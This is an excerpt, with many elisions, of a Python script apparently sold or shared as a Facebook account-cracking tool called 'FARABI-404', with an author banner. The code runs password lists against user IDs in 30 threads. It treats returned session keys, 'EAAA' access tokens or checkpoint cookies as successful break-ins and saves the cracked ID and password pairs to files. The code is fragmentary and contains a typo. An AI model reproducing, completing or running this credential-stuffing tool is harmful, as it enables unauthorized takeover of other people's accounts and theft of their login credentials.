...
def crack(idf,pwv):
	...
	sys.stdout.write('\r %s[FARABI] %s/%s | [OK] %s | [CP] %s  '%(bi,loop,len(id2),len(ok),cp)),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print( f'\r\x1b[1;91m[FARABI-CP] {idf} * {pw}')
				...
				open('/sdcard/FARABI-CP.txt','a').write('%s\n' % wrt)
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;92m [Successful-FARABI] {idf} * {pw}')
				...
				print(f'\r\x1b[1;92m [Successful-FARABI] {idf} * {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/Successful-FARABI.txt','a').write('%s\n' % wrt)
...
logo ="""\033[1;32m  
    ...
    _________    ____  ___    ____  ____     __ __  ____  __ __
   / ____/   |  / __ \/   |  / __ )/  _/    / // / / __ \/ // /
  / /_  / /| | / /_/ / /| | / __  |/ /_____/ // /_/ / / / // /_
 / __/ / ___ |/ _, _/ ___ |/ /_/ // /_____/__  __/ /_/ /__  __/
/_/   /_/  |_/_/ |_/_/  |_/_____/___/       /_/  \____/  /_/   
...
\033[1;32m[-]\033[1;32mAUTHOR    :\033[1;32m FARABI AHMED
\033[1;32m[-]\033[1;32mGITHUB    :\033[1;32m FARABI404KING
\033[1;32m[-]\033[1;32mTEAM      :\033[1;32m NAI
\033[1;32m===============================================================
...
class Main:
	...
	def __init__(self):
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://www.facebook.com/Farabi.Ahmed.404F")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n\033[1;32m [+] FARABI-404 HAS BEEN START")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]%s> /[FARABI]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-FARABI]%s | %s\033[1;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("Successful-FARABI.txt","a").write(" %s|%s\n"%(uid, pw))
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n\033[0;97m [+] FARABI-404 HAS BEEN START")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]>%s/[FARABI-404]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-FARABI-404] %s | %s\033[0;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("Successful-FARABI-404.txt","a").write(" %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[1;32m[Successful-FARABI-404] %s | %s\033[1;32m         "%(uid, pw))
